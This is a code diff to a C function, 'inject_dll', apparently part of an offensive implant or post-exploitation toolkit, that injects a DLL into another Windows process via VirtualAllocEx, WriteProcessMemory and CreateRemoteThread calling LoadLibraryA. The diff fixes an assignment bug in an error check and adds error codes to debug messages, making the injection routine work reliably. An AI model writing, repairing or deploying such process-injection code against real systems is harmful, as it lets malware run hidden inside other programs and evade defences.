@@ -19,7 +19,7 @@ void inject_dll(unsigned char *payload, int payload_size, char *payload_info) {
     LPVOID remote_buffer;
     HANDLE h_proc;
     HANDLE h_remote_thread;
-
+    
     DEBUG_PRINT("Starting inject_dll routine...\n");
 
     // Extract arguments from payload_info
@@ -51,25 +51,25 @@ void inject_dll(unsigned char *payload, int payload_size, char *payload_info) {
     }
 
     // Retrieve address of LoadLibraryA function
-    DEBUG_PRINT("Retrieving address of LoadLibraryA function\n");
+    DEBUG_PRINT("Retrieving address of LoadLibraryA function...\n");
     loadlibrary_address = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
     if(loadlibrary_address == NULL) {
-        DEBUG_PRINT("Failed.\n");
+        DEBUG_PRINT("Failed to retrieve address.\n");
         return;    
     }    
 
     // Allocate buffer in target process to store the path to the dll to be injected
-    DEBUG_PRINT("Allocating memory in target process to store dll path...\n");
+    DEBUG_PRINT("Allocating at least %d bytes of memory in target process to store dll path...\n", strlen(dll_path));
     remote_buffer = VirtualAllocEx(h_proc, NULL, strlen(dll_path), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
-    if(remote_buffer = NULL) {
-        DEBUG_PRINT("Memory allocation failed.\n");
+    if(remote_buffer == NULL) {
+        DEBUG_PRINT("Memory allocation failed, system error code is %u.\n", GetLastError());
         return;
     }
 
     // Write dll path into allocated memory
     DEBUG_PRINT("Writing dll path into allocated memory...\n");
-    if(WriteProcessMemory(h_proc, remote_buffer, dll_path, strlen(dll_path), NULL) == 0) {
-        DEBUG_PRINT("Write operation failed.\n");
+    if(WriteProcessMemory(h_proc, remote_buffer, (LPCVOID) dll_path, strlen(dll_path), NULL) == 0) {
+        DEBUG_PRINT("Write operation failed, system error code is %u.\n", GetLastError());
         return;
     }
 
@@ -77,7 +77,7 @@ void inject_dll(unsigned char *payload, int payload_size, char *payload_info) {
     DEBUG_PRINT("Creating remote thread that invokes the DLL via LoadLibrary...\n");
     h_remote_thread = CreateRemoteThread(h_proc, NULL, 0, (LPTHREAD_START_ROUTINE) loadlibrary_address, remote_buffer, 0, NULL);
     if(h_remote_thread == NULL) {
-        DEBUG_PRINT("Thread creation failed.\n");
+        DEBUG_PRINT("Thread creation failed, system error code is %u.\n", GetLastError());
         return;
     }
 
